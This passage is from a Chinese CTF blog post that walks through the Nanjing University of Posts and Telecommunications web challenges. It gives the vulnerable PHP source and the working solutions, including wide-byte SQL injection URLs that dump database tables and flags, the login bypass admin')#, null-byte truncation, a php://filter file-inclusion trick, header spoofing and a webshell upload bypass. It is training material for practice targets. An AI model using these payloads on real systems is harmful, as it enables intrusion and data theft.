class="string">"name"</span>],<span class="string">"php"</span>))&#123;</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</div></pre></td></tr></table></figure>
<p>4）根据代码来判断文件的type要为image、其次文件name要有php：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="屏幕快照 2017-10-24 下午3.14.16"></p>
<p>####明天双十一</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"不想剁手了"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"哎呀，这里只允许10.10.10.10访问！！！"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"这个地方剁手不好，换个地方！"</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>一目了然，只需要将几个关键地方设置正确即可：</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="屏幕快照 2017-10-24 下午3.01.40"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/24/南京邮电CTF题解/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/24/南京邮电CTF题解/" itemprop="url">
                  南京邮电CTF题解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-24T16:02:49+08:00">
                2017-10-24
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/10/24/南京邮电CTF题解/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/24/南京邮电CTF题解/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/10/24/南京邮电CTF题解/" class="leancloud_visitors" data-flag-title="南京邮电CTF题解">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>nctf{flag_admiaanaaaaaaaaaaa}</p>
<h4 id="php的弱类型加MD5碰撞"><a href="#php的弱类型加MD5碰撞" class="headerlink" title="php的弱类型加MD5碰撞"></a>php的弱类型加MD5碰撞</h4><p>首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs</p>
<p>flag nctf{md5_collision_is_easy}</p>
<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>考察html中的一些知识，在此直接用开发者工具修改即可</p>
<p>nctf{follow_me_to_exploit}</p>
<h4 id="基本图片隐写术"><a href="#基本图片隐写术" class="headerlink" title="基本图片隐写术"></a>基本图片隐写术</h4><p>macos下类似winhex的软件有<a href="http://ridiculousfish.com/hexfiend/" target="_blank" rel="external">http://ridiculousfish.com/hexfiend/</a></p>
<p>nctf{photo_can_also_hid3_msg}</p>
<h4 id="源码分析进阶"><a href="#源码分析进阶" class="headerlink" title="源码分析进阶"></a>源码分析进阶</h4><p>访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。</p>
<p>nctf{this_is_a_fl4g}</p>
<h4 id="js的AAencode"><a href="#js的AAencode" class="headerlink" title="js的AAencode"></a>js的AAencode</h4><p>其实已经提示是AAencode了，想办法解密就行。比如你可以再<a href="http://tool.isex.ren/aadecode" target="_blank" rel="external">http://tool.isex.ren/aadecode</a>这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行）</p>
<p>alert(“nctf{javascript_aaencode}”)</p>
<h4 id="单身拼手速"><a href="#单身拼手速" class="headerlink" title="单身拼手速"></a>单身拼手速</h4><p>我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag</p>
<p>当然也可能是出好了，考察的就是跳转</p>
<p>nctf{yougotit_script_now}</p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。</p>
<p>nctf{http_referer}</p>
<h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpfunction CLsI($ZzvSWE) &#123;    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);    &#125;    return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure>
<p>修改为如下代码，运行即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">function CLsI($ZzvSWE) &#123;</div><div class="line"></div><div class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</div><div class="line"></div><div class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</div><div class="line"></div><div class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return $ZzvSWE;</div><div class="line"></div><div class="line">&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</div></pre></td></tr></table></figure>
<p>其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章<a href="https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html" target="_blank" rel="external">https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html</a></p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>参考如下文章，构造<a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="external">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p>
<p><a href="http://www.2cto.com/article/201311/258420.html" target="_blank" rel="external">http://www.2cto.com/article/201311/258420.html</a></p>
<p>实在不会我们还有工具：<a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="external">https://github.com/D35m0nd142/LFISuite</a></p>
<h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h4><p>考察302跳转：<a href="http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html</a></p>
<p>做题用burp抓包放repeater就行，其实用curl也可以</p>
<p>例如我用curl命令来做一下，其实这个源码也很好猜的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">➜  ~ curl -i http://chinalover.sinaapp.com/web9/index.php</div><div class="line"></div><div class="line">HTTP/1.1 302 Found</div><div class="line"></div><div class="line">Server: sae</div><div class="line"></div><div class="line">Date: Mon, 11 Sep 2017 08:29:53 GMT</div><div class="line"></div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">Content-Length: 0</div><div class="line"></div><div class="line">Connection: keep-alive</div><div class="line"></div><div class="line">flag: nctf&#123;this_is302redirect&#125;</div><div class="line"></div><div class="line">Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</div><div class="line"></div><div class="line">Via: 1566</div></pre></td></tr></table></figure>
<h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h4><p>提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666}</p>
<p>download.php的源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">error_reporting(0);</div><div class="line"></div><div class="line">include(&quot;hereiskey.php&quot;);</div><div class="line"></div><div class="line">$url=base64decode($GET[url]);</div><div class="line"></div><div class="line">if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;</div><div class="line"></div><div class="line">	$file_size = filesize($url);</div><div class="line"></div><div class="line">	header ( &quot;Pragma: public&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Cache-Control: private&quot;, false );</div><div class="line"></div><div class="line">	header ( &quot;Content-Transfer-Encoding: binary&quot; );</div><div class="line"></div><div class="line">	header ( &quot;Content-Type:audio/mpeg MP3&quot;);</div><div class="line"></div><div class="line">	header ( &quot;Content-Length: &quot; . $file_size);</div><div class="line"></div><div class="line">	header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);</div><div class="line"></div><div class="line">	echo(file_get_contents($url));</div><div class="line"></div><div class="line">	exit;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">else &#123;</div><div class="line"></div><div class="line">	echo &quot;Access Forbidden!&quot;;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h4><p>看到提示0==not，果断抓包把0改成1，然后就有了flag</p>
<p>flag:nctf{cookie_is_different_from_session}</p>
<h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>提示让看robots.txt</p>
<p>然后看到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?phpif($GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;</div></pre></td></tr></table></figure>
<p>其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。</p>
<p>the flag is:nctf{query_in_mysql}</p>
<h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h4><p>其实看到连接就知道是gbk的问题了，后面提示也有</p>
<p>your sql:select id,title from news where id = ‘2’</p>
<p>gbk_sql_injection</p>
<p>关于宽字节注入问题可以看这个文章：</p>
<p><a href="http://www.91ri.org/8611.html" target="_blank" rel="external">http://www.91ri.org/8611.html</a></p>
<p><a href="https://www.2cto.com/article/201301/182881.html" target="_blank" rel="external">https://www.2cto.com/article/201301/182881.html</a></p>
<p>你可以手动来做：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() #</div></pre></td></tr></table></figure>
<p>your sql:select id,title from news where id = ‘運’ union select 1,database() #’</p>
<p>sae-chinalover</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</div></pre></td></tr></table></figure>
<p>your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’</p>
<p>ctf,ctf2,ctf3,ctf4,news</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23</div></pre></td></tr></table></figure>
<p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’</p>
<p>id,flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23</div></pre></td></tr></table></figure>
<p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’</p>
<p>1:nctf{gbk_3sqli}</p>
<h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><p>看标题就知道这个是在考察00截断</p>
<p>分析下这段代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (isset ($GET[&apos;nctf&apos;])) &#123;        if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE)            echo &apos;必须输入数字才行&apos;;        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)               die(&apos;Flag: &apos;.$flag);        else            echo &apos;骚年，继续努力吧啊~&apos;;    &#125;</div></pre></td></tr></table></figure>
<p>ereg(mode, string subject, array regs);</p>
<p>mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束）</p>
<p>subject： 需要验证的字符串</p>
<p>matchs/regs： 匹配后得到的结果。以数组的形式存储</p>
<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
<p>构造：</p>
<p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu</a></p>
<p>网上也有说构造</p>
<p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=" target="_blank" rel="external">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=</a></p>
<p>这个原因是因为报错并返回null（多亏了wonderkun大佬）</p>
<h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h4><p>这个题跟上面那个是不一样的，注意是===</p>
<p>所以姿势如下：<a href="http://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="external">http://www.cnblogs.com/weidiao/p/6821812.html</a></p>
<p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c" target="_blank" rel="external">http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c</a></p>
<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>看下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</div><div class="line"></div><div class="line">    &lt;?php</div><div class="line"></div><div class="line">    extract($_POST);</div><div class="line"></div><div class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</div><div class="line"></div><div class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line"></div><div class="line">        &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;?php &#125; ?&gt;</div><div class="line"></div><div class="line">&lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure>
<p>extract()出现的问题，详情见：</p>
<p><a href="http://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="external">http://www.cnblogs.com/sqyysec/p/6926095.html</a></p>
<p>构造：</p>
<p>pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可）</p>
<h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h4><p><a href="http://way.nuptzj.cn/php/index.txt" target="_blank" rel="external">http://way.nuptzj.cn/php/index.txt</a>看到源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</div><div class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</div><div class="line">  exit();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line">if($_GET[id] == &quot;hackerDJ&quot;)</div><div class="line">&#123;</div><div class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</div><div class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同</p>
<p>其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可</p>
<p>nctf{php_is_best_language}</p>
<h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><p>看到这句“管理系统只能在本地登陆”就知道了</p>
<p>抓包增加：X-Forwarded-For: 127.0.0.1</p>
<p>nctf{happy_http_headers}</p>
<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>flag在响应头中，用burp看下就行</p>
<p>nctf{tips_often_hide_here}</p>
<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>这题网上大多都写错了，有必要一写。</p>
<p>首先我们上传1.png（但实际文件内容写的是php一句话）</p>
<p>上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。</p>
<p>具体的方式为用burp在hex中将空格20修改为00</p>
<p>nctf{welcome_to_hacks_world}</p>
<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>知道了是post注入之后我们看代码就好</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = trim($_POST[user]);</div><div class="line">  $pass = md5(trim($_POST[pass]));</div><div class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</div><div class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  if($query[user]==&quot;admin&quot;) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  if($query[user] != &quot;admin&quot;) &#123;</div><div class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">echo $query[user];</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>trim()是去除两侧空格，重点在于依据下面这句进行构造</p>
<p>$sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”;</p>
<p>构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉</p>
<p>nctf{ni_ye_hui_sql?}</p>
<h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h4><p>来继续审计：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$pass=@$_POST[&apos;pass&apos;];</div><div class="line">$pass1=***********;//被隐藏起来的密码</div><div class="line">if(isset($pass))</div><div class="line">&#123;</div><div class="line">if(@!strcmp($pass,$pass1))&#123;</div><div class="line">echo &quot;flag:nctf&#123;*&#125;&quot;;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;the pass is wrong!&quot;;</div><div class="line">&#125;</div><div class="line">&#125;else&#123;</div><div class="line">echo &quot;please input pass!&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行</p>
<p>flag:nctf{strcmp_is_n0t_3afe}</p>
<h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p>审计！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> function noother_says_correct($number)</div><div class="line">&#123;</div><div class="line">        $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。</div><div class="line">        $nine = ord(&apos;9&apos;);</div><div class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</div><div class="line">        &#123;   </div><div class="line">                $digit = ord($number&#123;$i&#125;);</div><div class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">                &#123;</div><div class="line">                        return false;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">           return $number == &apos;54975581388&apos;;</div><div class="line">&#125;</div><div 